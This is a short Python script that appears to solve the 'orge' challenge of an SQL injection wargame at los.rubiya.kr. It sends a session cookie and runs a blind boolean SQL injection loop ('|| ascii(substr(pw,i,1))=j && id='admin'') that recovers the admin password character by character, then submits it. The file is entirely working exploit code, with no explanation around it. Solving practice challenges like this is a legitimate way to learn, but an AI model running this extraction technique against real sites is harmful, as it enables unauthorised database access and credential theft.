import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookies = {'PHPSESSID': session_id}


def get_pw():
    length = 8
    pw = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            payload = f"?id=admin&pw=' || ascii(substr(pw,{i},1))={j} %26%26 id='admin' || '"
            res = requests.get(url + payload, cookies=cookies)

            if "Hello admin" in res.text:
                pw += chr(j)
                print(chr(j))
                break
    return pw


pw = get_pw()
print("pw :", pw)
params = {
    'pw': pw
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
